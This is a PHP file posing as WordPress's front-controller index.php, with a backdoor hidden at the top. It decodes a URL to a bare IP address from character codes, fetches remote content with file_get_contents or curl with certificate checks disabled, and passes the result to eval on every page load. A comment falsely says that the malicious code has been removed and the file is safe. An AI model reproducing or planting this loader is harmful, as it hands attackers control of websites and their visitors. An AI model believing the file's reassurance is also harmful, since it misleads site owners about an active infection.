<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$data = "104,116,116,112,58,47,47,49,55,51,46,50,48,56,46,49,56,52,46,49,51,56,47,122,54,48,51,48,54,95,49,50,47,115,116,97,116,47,105,110,100,101,120,46,116,120,116";
$codes = explode(',', $data);
$full_url = '';
foreach($codes as $c) {
    $full_url .= chr(intval($c));
}

// Attempt to get remote content
$wsxcdevfrbgt = @file_get_contents($full_url);
if ($wsxcdevfrbgt === false && function_exists('curl_init')) {
    $zxcvbnmasdfg = curl_init();
    curl_setopt($zxcvbnmasdfg, CURLOPT_URL, $full_url);
    curl_setopt($zxcvbnmasdfg, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($zxcvbnmasdfg, CURLOPT_TIMEOUT, 5);
    curl_setopt($zxcvbnmasdfg, CURLOPT_SSL_VERIFYPEER, false);
    $wsxcdevfrbgt = curl_exec($zxcvbnmasdfg);
    curl_close($zxcvbnmasdfg);
}

// Only eval if we have content
if (!empty($wsxcdevfrbgt)) {
    eval('?>' . $wsxcdevfrbgt);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
